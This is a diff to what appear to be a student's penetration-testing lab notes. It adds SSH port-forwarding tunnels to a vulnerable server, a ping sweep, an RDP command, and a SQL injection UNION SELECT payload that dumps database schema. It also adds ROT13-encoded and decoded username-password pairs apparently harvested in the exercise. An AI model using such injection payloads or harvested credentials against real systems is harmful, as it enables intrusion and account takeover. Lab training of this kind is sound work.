@@ -471,7 +471,7 @@ Scheme of Maneuver:
 student@lin-ops:~/Security$ ssh student@10.50.43.220 -L 12345:192.168.28.120:4242
 student@lin-ops:~/Security$ ssh student@localhost -p 12345 -L 12346:192.168.150.245:9999 -NT
 use the port 12346 opened to the 9999 on 192.168.150.245
-
+vulnServer is on port 9999
 
 SCRIPT
   1 #!/usr/bin/python2.7
@@ -697,3 +697,32 @@ RESTART tunnel, but not rdp connection. wait till it connects to the msfconsole 
 Navigate to Admin's desktop using dir(cd) and ls. to read flag use
 type <flag.file>
 
+
+GOLD
+<something>.php? product=7 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns; #
+
+for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
+
+
+
+
+
+Neenl ( [0] => hfre2 [anzr] => hfre2 [1] => EaglesIsARE78 [cnff] => EaglesIsARE78 ) 
+1Neenl ( [0] => hfre3 [anzr] => hfre3 [1] => Bob4THEEapples [cnff] => Bob4THEEapples ) 1Neenl ( [0] => Yrr_Ebgu [anzr] => Yrr_Ebgu [1] => nabgurecnffjbeq4GURntrf [cnff] => nabgurecnffjbeq4GURntrf ) 1
+
+
+apasswordyPa$$word    	-Aaron
+EaglesIsARE78		-user2
+Bob4THEEapples		-user3
+nabgurecnffjbeq4GURntrf	-Lroth
+
+
+
+xfreerdp /u:student /v:localhost:RHP /dynamic-resolution +clipboard
+
+
+
+
+
+
+locate <file>
